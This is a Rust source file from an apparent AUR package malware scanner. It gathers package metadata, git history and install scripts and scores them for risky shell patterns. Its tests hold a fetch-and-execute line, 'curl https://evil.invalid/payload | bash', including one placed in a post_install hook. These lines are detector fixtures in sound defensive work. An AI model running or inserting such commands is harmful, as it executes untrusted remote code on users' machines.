use crate::features::{self, Feature};
use crate::shared::models::PackageContext;
use crate::shared::output;
use crate::shared::scoring::{self, ScanResult, Tier};
use std::collections::HashSet;

/// Network-backed package context plus inert executable helpers from the same
/// verified AUR Git tree. Helpers are analyzed as shell inputs without being
/// mistaken for additions to the PKGBUILD's temporal diff.
pub struct ScanContext {
    package: PackageContext,
    executable_helper_content: Option<String>,
}

/// Scan a package by name, printing results. Returns the computed tier.
pub fn scan_package(package_name: &str, json: bool, verbose: bool) -> Result<Tier, String> {
    let ctx = build_context(package_name)?;
    let result = run_scan_context(&ctx);

    if json {
        output::print_json(&result);
    } else {
        output::print_text(&result, verbose);
    }

    Ok(result.tier)
}

/// Build a verified scan context by fetching all data needed for analysis.
pub fn build_context(package_name: &str) -> Result<ScanContext, String> {
    use crate::shared::{aur_comments, aur_git, aur_rpc, cache, github, local_build};

    let metadata = aur_rpc::fetch_package_info(package_name)?;

    // Determine package base (for split packages)
    let package_base = metadata.package_base.as_deref().unwrap_or(package_name);

    // Clone/pull the AUR git repo
    let git_cache = cache::git_cache_dir();
    let cache_str = git_cache.to_str().unwrap_or("/tmp/bewaur-git");

    let repo_path = aur_git::ensure_repo(package_base, cache_str)?;
    let tree = local_build::load_build_tree(&repo_path, package_base)?;
    let pkgbuild_content = Some(tree.pkgbuild_content);
    let install_script_content = tree.install_script_content;
    let executable_helper_content = tree.local_source_content;
    let mut git_log = aur_git::read_git_log(&repo_path, 20);

    // Attach diff to the latest commit
    if let Some(first) = git_log.first_mut() {
        first.diff = aur_git::get_latest_diff(&repo_path);
    }

    // Read prior PKGBUILD for diff comparison
    let prior_pkgbuild_content = if git_log.len() >= 2 {
        aur_git::read_pkgbuild_at_revision(&repo_path, "HEAD~1")
    } else {
        None
    };

    // Fetch maintainer's other packages for reputation analysis
    let maintainer_packages = metadata
        .maintainer
        .as_deref()
        .and_then(|m| aur_rpc::fetch_maintainer_packages(m).ok())
        .unwrap_or_default();

    // Fetch GitHub stars if upstream URL points to GitHub
    let (github_stars, github_not_found) = metadata
        .url
        .as_deref()
        .and_then(|url| github::fetch_github_stars(url))
        .map(|info| {
            (
                if info.found { Some(info.stars) } else { None },
                !info.found,
            )
        })
        .unwrap_or((None, false));

    // Fetch recent AUR comments
    let aur_comments = aur_comments::fetch_recent_comments(package_base);

    Ok(ScanContext {
        package: PackageContext {
            name: package_name.to_string(),
            metadata: Some(metadata),
            pkgbuild_content,
            install_script_content,
            prior_pkgbuild_content,
            git_log,
            maintainer_packages,
            github_stars,
            github_not_found,
            aur_comments,
        },
        executable_helper_content,
    })
}

/// Build context using pre-fetched metadata. Only the git clone hits the network.
/// Returns Err if git clone fails — no PKGBUILD means no meaningful analysis.
pub fn build_context_prefetched(
    package_name: &str,
    metadata: crate::shared::models::AurPackage,
    maintainer_packages: Vec<crate::shared::models::AurPackage>,
) -> Result<ScanContext, String> {
    use crate::shared::{aur_comments, aur_git, cache, github, local_build};

    let package_base = metadata.package_base.as_deref().unwrap_or(package_name);

    let git_cache = cache::git_cache_dir();
    let cache_str = git_cache.to_str().unwrap_or("/tmp/bewaur-git");

    let repo_path = aur_git::ensure_repo(package_base, cache_str)?;
    let tree = local_build::load_build_tree(&repo_path, package_base)?;
    let pkgbuild = Some(tree.pkgbuild_content);
    let install = tree.install_script_content;
    let executable_helper_content = tree.local_source_content;
    let mut log = aur_git::read_git_log(&repo_path, 20);

    if let Some(first) = log.first_mut() {
        first.diff = aur_git::get_latest_diff(&repo_path);
    }

    let prior = if log.len() >= 2 {
        aur_git::read_pkgbuild_at_revision(&repo_path, "HEAD~1")
    } else {
        None
    };

    let (gh_stars, gh_not_found) = metadata
        .url
        .as_deref()
        .and_then(|url| github::fetch_github_stars(url))
        .map(|info| {
            (
                if info.found { Some(info.stars) } else { None },
                !info.found,
            )
        })
        .unwrap_or((None, false));

    let comments = aur_comments::fetch_recent_comments(package_base);

    Ok(ScanContext {
        package: PackageContext {
            name: package_name.to_string(),
            metadata: Some(metadata),
            pkgbuild_content: pkgbuild,
            install_script_content: install,
            prior_pkgbuild_content: prior,
            git_log: log,
            maintainer_packages,
            github_stars: gh_stars,
            github_not_found: gh_not_found,
            aur_comments: comments,
        },
        executable_helper_content,
    })
}

/// Scan a local PKGBUILD string without network access.
pub fn scan_pkgbuild(name: &str, pkgbuild_content: &str) -> ScanResult {
    let ctx = local_build_context(name, pkgbuild_content, None);
    run_analysis(&ctx)
}

/// Scan a local build tree's inert contents with an already-loaded config.
///
/// This is the pre-build equivalent of `scan_pkgbuild`, with the referenced
/// install scripts included in the same analysis pass.
pub fn scan_local_build_with_config(
    name: &str,
    pkgbuild_content: &str,
    install_script_content: Option<&str>,
    executable_helper_content: Option<&str>,
    config: &crate::shared::config::Config,
) -> ScanResult {
    let ctx = local_build_context(name, pkgbuild_content, install_script_content);
    run_analysis_inputs_with_config(&ctx, executable_helper_content, config)
}

/// Scan only the transaction-time shell code embedded in an ALPM `.INSTALL`
/// entry. Artifact inspection deliberately avoids running unrelated metadata,
/// source, checksum, and PKGBUILD features against a fabricated context.
pub fn scan_install_script_with_config(
    package_name: &str,
    install_script_content: &str,
    config: &crate::shared::config::Config,
) -> ScanResult {
    let ctx = PackageContext {
        name: package_name.to_string(),
        metadata: None,
        pkgbuild_content: None,
        install_script_content: Some(install_script_content.to_string()),
        prior_pkgbuild_content: None,
        git_log: Vec::new(),
        maintainer_packages: Vec::new(),
        github_stars: None,
        github_not_found: false,
        aur_comments: Vec::new(),
    };
    let install_features: [Box<dyn Feature>; 3] = [
        Box::new(features::install_script_analysis::InstallScriptAnalysis),
        Box::new(features::shell_analysis::ShellAnalysis),
        Box::new(features::gtfobins_analysis::GtfobinsAnalysis),
    ];
    let mut signals = Vec::new();
    for feature in install_features {
        signals.extend(feature.analyze(&ctx));
    }
    let mut seen = HashSet::new();
    signals.retain(|signal| seen.insert(signal.id.clone()));
    signals.retain(|signal| {
        !crate::shared::config::is_signal_ignored(config, &signal.id, &signal.category)
    });
    scoring::compute_score(package_name, &signals)
}

fn local_build_context(
    name: &str,
    pkgbuild_content: &str,
    install_script_content: Option<&str>,
) -> PackageContext {
    PackageContext {
        name: name.to_string(),
        metadata: None,
        pkgbuild_content: Some(pkgbuild_content.to_string()),
        install_script_content: install_script_content.map(str::to_string),
        prior_pkgbuild_content: None,
        git_log: Vec::new(),
        maintainer_packages: Vec::new(),
        github_stars: None,
        github_not_found: false,
        aur_comments: vec![],
    }
}

/// Run all registered features against the context and compute a score.
pub fn run_analysis(ctx: &PackageContext) -> ScanResult {
    let config = crate::shared::config::load_config();
    run_analysis_with_config(ctx, &config)
}

/// Run a verified network scan, including executable helpers from the same
/// checked-out AUR tree.
pub fn run_scan_context(ctx: &ScanContext) -> ScanResult {
    let config = crate::shared::config::load_config();
    run_scan_context_with_config(ctx, &config)
}

/// Run a verified network scan with a pre-loaded config.
pub fn run_scan_context_with_config(
    ctx: &ScanContext,
    config: &crate::shared::config::Config,
) -> ScanResult {
    run_analysis_inputs_with_config(
        &ctx.package,
        ctx.executable_helper_content.as_deref(),
        config,
    )
}

/// Run analysis with a pre-loaded config (avoids reloading per package in bulk scans).
pub fn run_analysis_with_config(
    ctx: &PackageContext,
    config: &crate::shared::config::Config,
) -> ScanResult {
    run_analysis_inputs_with_config(ctx, None, config)
}

fn run_analysis_inputs_with_config(
    ctx: &PackageContext,
    executable_helper_content: Option<&str>,
    config: &crate::shared::config::Config,
) -> ScanResult {
    let all_features = features::all_features();

    let mut all_signals = Vec::new();
    for feature in &all_features {
        let signals = feature.analyze(ctx);
        all_signals.extend(signals);
    }

    if let Some(content) = executable_helper_content {
        let helper_ctx = local_build_context(&ctx.name, content, None);
        let executable_features: [Box<dyn Feature>; 3] = [
            Box::new(features::pkgbuild_analysis::PkgbuildAnalysis),
            Box::new(features::shell_analysis::ShellAnalysis),
            Box::new(features::gtfobins_analysis::GtfobinsAnalysis),
        ];
        for feature in executable_features {
            all_signals.extend(feature.analyze(&helper_ctx));
        }

        // The old concatenated representation emitted each signal at most
        // once. Preserve that behavior when the same pattern appears in both
        // PKGBUILD and helper content while keeping the raw PKGBUILD available
        // to temporal and source/checksum features.
        let mut seen = HashSet::new();
        all_signals.retain(|signal| seen.insert(signal.id.clone()));
    }

    if !config.ignored.signals.is_empty() || !config.ignored.categories.is_empty() {
        all_signals
            .retain(|s| !crate::shared::config::is_signal_ignored(config, &s.id, &s.category));
    }

    scoring::compute_score(&ctx.name, &all_signals)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn executable_helpers_are_scanned_without_polluting_pkgbuild_diff() {
        let raw_pkgbuild = "pkgname=demo\npkgver=1\npkgrel=1\npackage() { :; }\n";
        let mut context = local_build_context("demo", raw_pkgbuild, None);
        context.prior_pkgbuild_content = Some(raw_pkgbuild.to_string());
        let config = crate::shared::config::Config::default();

        let result = run_analysis_inputs_with_config(
            &context,
            Some("curl https://evil.invalid/payload | bash\n"),
            &config,
        );

        assert!(
            result
                .signals
                .iter()
                .any(|signal| signal.id == "P-CURL-PIPE"),
            "helper content was not analyzed: {:?}",
            result.signals
        );
        assert!(
            !result
                .signals
                .iter()
                .any(|signal| signal.category == crate::shared::scoring::SignalCategory::Temporal),
            "unchanged raw PKGBUILD produced a temporal helper diff: {:?}",
            result.signals
        );
    }

    #[test]
    fn install_script_scan_runs_only_transaction_time_features() {
        let config = crate::shared::config::Config::default();
        let result = scan_install_script_with_config(
            "demo",
            "post_install() { curl https://evil.invalid/payload | bash; }",
            &config,
        );

        assert!(
            result
                .signals
                .iter()
                .any(|signal| signal.id == "P-INSTALL-PIPE-SHELL")
        );
        assert!(
            !result
                .signals
                .iter()
                .any(|signal| signal.category == crate::shared::scoring::SignalCategory::Metadata)
        );
    }
}
